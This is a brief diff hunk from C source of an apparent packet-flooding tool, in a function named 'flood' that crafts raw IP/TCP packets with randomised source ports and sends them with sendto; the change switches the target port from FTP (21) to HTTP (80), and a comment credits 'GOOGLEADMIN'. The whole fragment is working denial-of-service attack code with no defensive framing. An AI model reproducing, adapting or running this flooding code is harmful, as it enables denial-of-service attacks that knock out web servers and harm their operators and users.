@@ -172,7 +172,7 @@ void *flood(void *par1)
         iph->check = csum ((unsigned short *) datagram, iph->tot_len);
         tcph->source = htons(rand_cmwc() & 0xFFFF);
         //tcph->source = htons(td->dport);
-        tcph->dest = htons(21);
+        tcph->dest = htons(80);
         tcph->check = tcpcsum(iph, tcph, 24);
         sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
         //SIMPLE PACKET EDITOR MADE BY GOOGLEADMIN
